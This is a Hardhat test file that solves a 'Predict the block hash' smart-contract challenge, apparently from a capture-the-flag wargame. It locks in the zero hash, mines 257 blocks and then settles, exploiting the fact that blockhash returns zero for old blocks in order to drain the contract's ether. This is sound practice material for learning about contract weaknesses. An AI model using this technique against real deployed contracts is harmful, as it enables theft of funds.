import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    await target.connect(attacker).lockInGuess(ethers.constants.HashZero, {value: ethers.utils.parseEther("1")});

    for (let i = 0; i < 257; i++) {
      await ethers.provider.send("evm_mine", []);
    }
    await target.connect(attacker).settle();
    expect(await target.isComplete()).to.equal(true);
  });
});
